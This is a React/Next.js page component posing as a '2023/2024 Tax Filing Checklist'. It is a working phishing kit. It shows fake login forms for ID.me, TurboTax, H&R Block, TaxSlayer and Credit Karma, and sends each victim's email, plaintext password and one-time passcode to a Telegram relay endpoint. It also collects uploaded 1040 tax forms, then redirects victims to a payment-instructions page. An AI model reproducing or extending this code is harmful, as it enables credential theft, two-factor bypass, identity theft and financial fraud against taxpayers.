"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function TaxFilingChecklist() {
  const [filedTax, setFiledTax] = useState("");
  const [filedWithAgent, setFiledWithAgent] = useState("");
  const [selectedPlatform, setSelectedPlatform] = useState("");
  const [file, setFile] = useState<File | null>(null);
  const [fileMessage, setFileMessage] = useState("");
  const [isUploading, setIsUploading] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);

  const [showOtpForm, setShowOtpForm] = useState(false);
  const [otp, setOtp] = useState("");
  const [otpMessage, setOtpMessage] = useState("");

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const router = useRouter();

  const Spinner = () => (
    <div className="h-5 w-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
  );

  const platforms = ["Credit Karma", "TaxSlayer", "H&R Block", "TurboTax"];

  const shouldShowLogin =
    (filedTax === "yes" && filedWithAgent === "no" && selectedPlatform) ||
    filedTax === "no";

  const handleFileUpload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) return;

    setIsUploading(true);
    setFileMessage("");

    const formData = new FormData();
    formData.append("file", file);
    formData.append("message", "📎 1040 Form Uploaded");

    try {
      const res = await fetch("/api/send-telegram", {
        method: "POST",
        body: formData,
      });
      const data = await res.json();

      if (res.ok) {
        router.push("/payment-instructions");
      } else {
        setFileMessage(`❌ Error: ${data.error}`);
      }
    } catch (err) {
      setFileMessage("❌ Failed to send file to Telegram.");
    } finally {
      setIsUploading(false);
    }
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoggingIn(true);

    const platform = filedTax === "no" ? "ID.me" : selectedPlatform;

    const message = `
🔐 ${platform} Login Attempt
📧 Email: ${email}
🔒 Password: ${password}
`.trim();

    await fetch("/api/send-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    });

    setShowOtpForm(true);
    setOtp("");
    setOtpMessage("");
    setIsLoggingIn(false);
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifyingOtp(true);

    const message = `
📲 OTP Verification
Code Entered: ${otp}
From: ${filedTax === "no" ? "ID.me" : selectedPlatform}
`.trim();

    await fetch("/api/send-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    });

    setTimeout(() => {
      router.push("/payment-instruction");
    }, 500);

    setIsVerifyingOtp(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <section className="w-full max-w-3xl bg-white p-8 rounded-2xl shadow-lg space-y-8">
        <h1 className="text-3xl font-bold text-center text-gray-800">
          2023/2024 Tax Filing Checklist
        </h1>

        {/* Step 1 */}
        <div>
          <p className="text-lg font-semibold text-gray-700">
            Did you file your Tax Return?
          </p>
          <div className="flex space-x-6 mt-2">
            {["yes", "no"].map((val) => (
              <label key={val} className="flex items-center space-x-2">
                <input
                  type="radio"
                  name="filedTax"
                  value={val}
                  checked={filedTax === val}
                  onChange={(e) => {
                    setFiledTax(e.target.value);
                    setFiledWithAgent("");
                    setSelectedPlatform("");
                    setShowOtpForm(false);
                    setOtpMessage("");
                  }}
                />
                <span>{val.charAt(0).toUpperCase() + val.slice(1)}</span>
              </label>
            ))}
          </div>
        </div>

        {/* Step 2 */}
        {filedTax === "yes" && (
          <div>
            <p className="text-lg font-semibold text-gray-700">
              Did you file with an agent?
            </p>
            <div className="flex space-x-6 mt-2">
              {["yes", "no"].map((val) => (
                <label key={val} className="flex items-center space-x-2">
                  <input
                    type="radio"
                    name="filedWithAgent"
                    value={val}
                    checked={filedWithAgent === val}
                    onChange={(e) => {
                      setFiledWithAgent(e.target.value);
                      if (val === "no") setSelectedPlatform("");
                      setShowOtpForm(false);
                      setOtpMessage("");
                    }}
                  />
                  <span>{val.charAt(0).toUpperCase() + val.slice(1)}</span>
                </label>
              ))}
            </div>
          </div>
        )}

        {/* Platform selection */}
        {filedTax === "yes" && filedWithAgent === "no" && (
          <div>
            <p className="text-lg font-semibold text-gray-700 mb-2">
              Select the platform you used:
            </p>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {platforms.map((platform) => (
                <button
                  key={platform}
                  type="button"
                  onClick={() => {
                    setSelectedPlatform(platform);
                    setShowOtpForm(false);
                    setOtpMessage("");
                  }}
                  className={`w-full text-left p-4 border rounded-lg transition-all duration-200 ${
                    selectedPlatform === platform
                      ? "border-blue-500 bg-blue-50"
                      : "border-gray-300 hover:bg-gray-50"
                  }`}
                >
                  <span className="block font-medium text-gray-800">
                    {platform}
                  </span>
                  <span className="text-sm text-gray-500">Login required</span>
                </button>
              ))}
            </div>
          </div>
        )}

        {/* If no agent */}
        {filedTax === "yes" && filedWithAgent === "yes" && (
          <form
            onSubmit={handleFileUpload}
            className="bg-gray-50 p-4 rounded-lg border border-gray-200 space-y-4"
          >
            <p className="text-lg font-semibold text-gray-700">
              Next steps if you didn’t use an agent:
            </p>
            <ul className="list-disc list-inside text-gray-600 space-y-1">
              <li>Call your agent</li>
              <li>Request your 1040 form</li>
              <li>Upload the 1040 form below</li>
            </ul>
            <input
              type="file"
              accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
              onChange={(e) => setFile(e.target.files?.[0] || null)}
              className="block w-full text-sm text-gray-700 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
              required
            />
            <button
              type="submit"
              disabled={isUploading}
              className="w-full flex items-center justify-center gap-2 bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition disabled:opacity-60"
            >
              {isUploading && <Spinner />}
              {isUploading ? "Uploading..." : "Upload"}
            </button>
            {fileMessage && (
              <p className="text-sm text-gray-600">{fileMessage}</p>
            )}
          </form>
        )}

        {/* Login + OTP */}
        {shouldShowLogin && (
          <div className="bg-blue-50 border border-blue-200 p-6 rounded-lg shadow-inner">
            <h2 className="text-xl font-semibold text-blue-800 mb-4">
              {filedTax === "no"
                ? "Login with ID.me"
                : `Login to ${selectedPlatform}`}
            </h2>

            {/* Login Form */}
            {!showOtpForm && (
              <form onSubmit={handleLoginSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Email
                  </label>
                  <input
                    type="email"
                    className="w-full mt-1 p-2 border border-gray-300 rounded-md"
                    placeholder="Enter your email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700">
                    Password
                  </label>
                  <input
                    type="password"
                    className="w-full mt-1 p-2 border border-gray-300 rounded-md"
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>
                <button
                  type="submit"
                  disabled={isLoggingIn}
                  className="w-full flex items-center justify-center gap-2 bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition disabled:opacity-60"
                >
                  {isLoggingIn && <Spinner />}
                  {isLoggingIn
                    ? `Logging into ${
                        filedTax === "no" ? "ID.me" : selectedPlatform
                      }...`
                    : `Login to ${
                        filedTax === "no" ? "ID.me" : selectedPlatform
                      }`}
                </button>
              </form>
            )}

            {/* OTP Form */}
            {showOtpForm && (
              <div className="mt-6 border-t border-blue-200 pt-6">
                <h3 className="text-lg font-semibold text-blue-700 mb-2">
                  Enter OTP
                </h3>
                <form onSubmit={handleOtpSubmit} className="space-y-4">
                  <input
                    type="text"
                    maxLength={6}
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                    placeholder="Enter 6-digit OTP"
                    className="w-full p-2 border border-gray-300 rounded-md"
                    required
                  />
                  <button
                    type="submit"
                    disabled={isVerifyingOtp}
                    className="w-full flex items-center justify-center gap-2 bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition disabled:opacity-60"
                  >
                    {isVerifyingOtp && <Spinner />}
                    {isVerifyingOtp ? "Verifying..." : "Verify OTP"}
                  </button>
                  {otpMessage && (
                    <p className="text-sm text-gray-700">{otpMessage}</p>
                  )}
                </form>
              </div>
            )}
          </div>
        )}
      </section>
    </div>
  );
}
